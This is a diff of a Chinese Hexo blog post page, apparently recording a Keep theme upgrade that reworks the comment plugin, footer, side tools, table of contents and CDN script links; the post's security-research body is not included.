+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/04/20/io-uring/"
+                                   title="io_uring在kernel pwn中的优异表现"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">io_uring在kernel pwn中的优异表现</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"
+                                   title="FUZZ(2):AFL结果分析和代码覆盖率"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">FUZZ(2):AFL结果分析和代码覆盖率</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90"><span class="nav-text">内核分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU%E5%88%86%E6%9E%90"><span class="nav-text">QEMU分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-1"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-1"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">综上，exp</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -495,13 +662,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -515,42 +681,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90"><span class="nav-text">内核分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU%E5%88%86%E6%9E%90"><span class="nav-text">QEMU分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-1"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-1"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">综上，exp</span></a></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -568,7 +737,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -582,29 +751,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90"><span class="nav-text">内核分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#QEMU%E5%88%86%E6%9E%90"><span class="nav-text">QEMU分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-1"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-1"><span class="nav-text">利用分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">综上，exp</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
